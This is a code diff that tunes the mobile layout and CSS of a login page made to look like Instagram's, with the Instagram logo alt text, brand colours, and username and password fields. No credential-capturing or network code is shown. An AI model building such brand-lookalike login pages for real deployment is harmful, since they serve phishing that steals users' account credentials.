@@ -16,28 +16,32 @@
         }
         .container {
             text-align: center;
+            width: 90%;
+            max-width: 350px; /* Fits most phone screens */
         }
         .logo {
-            width: 200px; /* Adjusted to match approximate logo size */
-            margin-bottom: 20px;
+            width: 40%; /* Relative size for phones */
+            margin-bottom: 15px;
         }
         .input-field {
             width: 100%;
-            padding: 10px;
-            margin: 10px 0;
+            padding: 8px;
+            margin: 8px 0;
             border: 1px solid #dbdbdb;
-            border-radius: 5px;
+            border-radius: 4px;
             box-sizing: border-box;
+            font-size: 14px;
         }
         .login-btn {
             background-color: #0095f6;
             color: white;
-            padding: 10px;
+            padding: 8px;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             width: 100%;
-            margin: 10px 0;
+            margin: 8px 0;
             cursor: pointer;
+            font-size: 14px;
         }
         .login-btn:hover {
             background-color: #007bb5;
@@ -46,18 +50,19 @@
             color: #00376b;
             text-decoration: none;
             font-size: 12px;
-            margin: 10px 0;
+            margin: 8px 0;
             display: block;
         }
         .create-account {
             background-color: #add8e6;
             color: black;
-            padding: 10px;
+            padding: 8px;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             width: 100%;
-            margin: 10px 0;
+            margin: 8px 0;
             cursor: pointer;
+            font-size: 14px;
         }
         .create-account:hover {
             background-color: #87ceeb;
@@ -65,13 +70,22 @@
         .meta {
             font-size: 12px;
             color: #8e8e8e;
-            margin-top: 20px;
+            margin-top: 15px;
+        }
+        @media (max-width: 480px) {
+            .logo {
+                width: 50%;
+            }
+            .input-field, .login-btn, .create-account {
+                font-size: 12px;
+                padding: 6px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="logo.png" alt="Instagram Logo" class="logo"> <!-- Replace with your logo image -->
+        <img src="logo.png" alt="Instagram Logo" class="logo">
         <input type="text" class="input-field" placeholder="Username, email address or mobile number">
         <input type="password" class="input-field" placeholder="Password">
         <button class="login-btn">Log in</button>
